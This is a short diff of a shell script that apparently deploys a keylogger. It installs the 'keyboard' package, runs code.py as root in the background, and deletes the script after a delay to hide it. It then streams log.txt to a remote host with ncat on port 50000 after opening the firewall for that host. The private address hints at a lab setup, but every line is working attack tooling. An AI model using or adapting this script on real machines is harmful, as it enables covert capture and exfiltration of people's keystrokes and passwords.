@@ -10,5 +10,5 @@ sudo ufw allow out to 192.168.64.1
 sudo ufw allow in from 192.168.64.1
 pip install keyboard
 sudo venv/bin/python3 -u code.py&
-sudo rm code.py &
+(sleep 5 && sudo rm code.py) &
 tail -f log.txt | ncat 192.168.64.1 50000                                      
